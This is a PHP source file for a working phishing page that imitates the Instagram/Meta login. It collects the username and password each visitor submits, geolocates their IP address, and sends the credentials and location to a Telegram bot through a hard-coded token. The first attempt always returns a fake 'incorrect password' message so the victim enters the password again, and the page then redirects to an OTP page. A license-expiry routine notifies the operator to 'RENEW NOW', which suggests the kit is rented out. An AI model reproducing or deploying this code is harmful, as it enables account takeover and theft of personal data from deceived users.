<?php
session_start(); // Start the session first

// Fetch the date from the text file (ensure the file is outside the web root for security)
$dateFile = 'time.txt'; // Move the file to a non-web-accessible directory
if (!file_exists($dateFile)) {
    die("Error: Time configuration file not found.");
}

$setDate = trim(file_get_contents($dateFile));
$setDate = new DateTime($setDate);

// Fetch the current time
$currentTime = new DateTime('now');

// Compare the current time with the set date
if ($currentTime > $setDate) {
    // Prevent multiple expired redirects
    if (!isset($_SESSION['expired_redirect_sent'])) {
        $_SESSION['expired_redirect_sent'] = true;
        
        // Start output buffering to prevent header issues
        ob_start();
        
        // Send expired message to Telegram before redirecting
        $expiredMessage = "⏰ Page Expired
Link: IG-VOTE
Status: Expired
RENEW NOW!";
        
        // Function to send message to Telegram using cURL
        function sendToTelegram($chatId, $message, $botToken) {
            $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $message,
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            
            $result = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($result === false || $httpCode !== 200) {
                return false;
            }
            
            $response = json_decode($result, true);
            return isset($response['ok']) && $response['ok'];
        }
        
        // Load Telegram chat ID from the text file
        if (file_exists('telegram_chat_id.txt')) {
            $chatId = trim(file_get_contents('telegram_chat_id.txt'));
            $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
            
            // Send the expired message to Telegram
            sendToTelegram($chatId, $expiredMessage, $botToken);
        }
        
        // Clear any output buffer
        ob_end_clean();
    }
    
    // Redirect to 404 page (make sure this file exists and doesn't redirect back)
    header('Location: 404.php'); // Changed to 404.php to be more explicit
    exit();
}

// Function to sanitize input
function sanitizeInput($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

// Function to get user location using cURL
// Enhanced function to get user location with multiple API fallbacks
function getUserLocation($ip) {

    $url = "https://ipinfo.io/{$ip}/json?token=373cceb2d26abd";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // Prevent following redirects
    // Array of reliable location APIs with fallbacks
    $apis = [
        // Primary: ipinfo.io (your current API)
        [
            'url' => "https://ipinfo.io/{$ip}/json?token=c645a154c3cdd5",
            'parser' => function($data) {
                return [
                    'country' => $data['country'] ?? 'Unknown',
                    'region' => $data['region'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'ip' => $data['ip'] ?? 'Unknown'
                ];
            }
        ],
        // Fallback 1: ip-api.com (free, reliable)
        [
            'url' => "http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,query",
            'parser' => function($data) {
                if (isset($data['status']) && $data['status'] === 'success') {
                    return [
                        'country' => $data['country'] ?? 'Unknown',
                        'region' => $data['regionName'] ?? 'Unknown',
                        'city' => $data['city'] ?? 'Unknown',
                        'ip' => $data['query'] ?? 'Unknown'
                    ];
                }
                return false;
            }
        ],
        // Fallback 2: ipapi.co (free tier available)
        [
            'url' => "https://ipapi.co/{$ip}/json/",
            'parser' => function($data) {
                if (!isset($data['error'])) {
                    return [
                        'country' => $data['country_name'] ?? 'Unknown',
                        'region' => $data['region'] ?? 'Unknown',
                        'city' => $data['city'] ?? 'Unknown',
                        'ip' => $data['ip'] ?? 'Unknown'
                    ];
                }
                return false;
            }
        ],
        // Fallback 3: ipgeolocation.io (free tier)
        [
            'url' => "https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY&ip={$ip}",
            'parser' => function($data) {
                return [
                    'country' => $data['country_name'] ?? 'Unknown',
                    'region' => $data['state_prov'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'ip' => $data['ip'] ?? 'Unknown'
                ];
            }
        ]
    ];

    
    foreach ($apis as $api) {
        $result = makeLocationRequest($api['url']);
        
        if ($result !== false) {
            $locationData = $api['parser']($result);
            if ($locationData !== false) {
                return $locationData;
            }
        }
        
        // Small delay between API calls to avoid rate limiting
        usleep(100000); // 0.1 second
    }
    
    return false;
}

// Enhanced cURL function with better error handling and retry logic
function makeLocationRequest($url, $retries = 2) {
    for ($i = 0; $i <= $retries; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15); // Increased timeout
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json',
            'Cache-Control: no-cache'
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        // Check for successful response
        if ($response !== false && $httpCode === 200 && empty($error)) {
            $decoded = json_decode($response, true);
            if (json_last_error() === JSON_ERROR_NONE) {
                return $decoded;
            }
        }
        
        // If not the last retry, wait before trying again
        if ($i < $retries) {
            sleep(1);
        }
    }
    
    return false;
}

// Function to get real user IP (handles proxies and load balancers)
function getRealUserIP() {
    $ipKeys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
               'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 
               'REMOTE_ADDR'];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            $ip = $_SERVER[$key];
            if (strpos($ip, ',') !== false) {
                $ip = explode(',', $ip)[0];
            }
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Function to send message to Telegram using cURL
function sendToTelegram($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // Prevent following redirects
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($result === false || $httpCode !== 200) {
        return false;
    }
    
    $response = json_decode($result, true);
    return isset($response['ok']) && $response['ok'];
}

$message = '';
$firstSubmission = isset($_SESSION['first_submission']) ? $_SESSION['first_submission'] : false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'], $_POST['user_age'])) {
    $name = sanitizeInput($_POST['user_name']);
    $password = sanitizeInput($_POST['user_age']);
    
    if (empty($name)) {
        $message = "Invalid input. Name is required.";
    } else {
        // Get user IP address
        $userIp = getRealUserIP();
        
        // Get user location with enhanced reliability
        $locationData = getUserLocation($userIp);
        
        // Set default values and update if location data is available
        $country = 'Unknown';
        $region = 'Unknown';
        $city = 'Unknown';
        $ip = $userIp;
        
        if ($locationData && is_array($locationData)) {
            $country = $locationData['country'] ?? 'Unknown';
            $region = $locationData['region'] ?? 'Unknown';
            $city = $locationData['city'] ?? 'Unknown';
            $ip = $locationData['ip'] ?? $userIp;
        }
        
        // Load Telegram chat ID from the text file
        if (file_exists('telegram_chat_id.txt')) {
            $chatId = trim(file_get_contents('telegram_chat_id.txt'));
        } else {
            $chatId = '';
        }
        
        if (empty($chatId)) {
            $message = "Chat ID is empty. Please check the telegram_chat_id.txt file.";
        } else {
            $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
            
            // Enhanced message with city information
            $telegramMessage = "📩NEW LOGIN ATTEMPT📩
            
DETAILS:
•📲 PLATFORM: INSTAGRAM
•👤 UserName: $name
•🔑 Password: $password

LOCATION:
•🌍 Country: $country
•🗺️ State: $region
•🏙️ City: $city
•🌐 IP: $ip

🔒•SECURED BY WIXXI TOOLS•🔒";
            
            if (!$firstSubmission) {
                // Store the first submission in the session
                $_SESSION['first_submission'] = [
                    'name' => $name,
                    'password' => $password,
                    'country' => $country,
                    'region' => $region,
                    'ip' => $ip
                ];
                
                // Send the first submission to Telegram
                if (sendToTelegram($chatId, $telegramMessage, $botToken)) {
                    $message = "Sorry, your password was incorrect. Please double-check your password.";
                } else {
                    $message = "Error sending message.";
                }
            } else {
                // Send message to Telegram on second submission
                if (sendToTelegram($chatId, $telegramMessage, $botToken)) {
                    // Clear the session variable after successful message sending
                    unset($_SESSION['first_submission']);
                    // Redirect to otp.php after successful message sending
                    header("Location: otp.php");
                    exit; 
                } else {
                    $message = "Error sending message.";
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet"/>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(to bottom right, #fbe0ff00, #c9ebf000);
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
     <div class="w-full max-w-sm p-6 rounded-lg">
        <div class="text-center mb-6">
            <img alt="Facebook logo" class="mx-auto mb-4" height="80" src="https://i.postimg.cc/FKk4ZQ1r/60ed83ab035dbe00046c24b8.png" width="70"/>
        </div>
        <br><br>
        <form method="POST" action="">
            <div class="mb-4">
                <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900" placeholder=" username, Mobile number or email address" type="text" name="user_name" required/>
            </div>
            <div class="mb-4">
                <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600" placeholder="Password" type="password" name="user_age" required/>
            </div>
            <div class="mb-4">
                <button class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-black-700" type="submit">
                    Log in
                </button>
                <?php if ($message) echo "<h3 class='text-red-500 mt-5'> &nbsp;&nbsp;" . htmlspecialchars($message) . "</h3>"; ?>
            </div>
            <div class="text-center mb-2">
                <a class="text-black-600 hover:underline" href="#">
                    Forgotten Password?
                </a>
            </div>
            <br><br><br><br><br>
            <div class="text-center mb-4">
                <button class="w-full py-3 border border-blue-600 text-blue-600 rounded-xl hover:bg-blue-50" type="button">
                    Create new account
                </button>
               
            </div>
            <div class="text-center mt-6">
                <img alt="Meta logo" class="mx-auto mb-2" height="20" src="https://i.postimg.cc/DZY1KLnd/pngegg-2.png" width="70"/>
            </div>
            
        </form>
    </div>
</body>
</html>
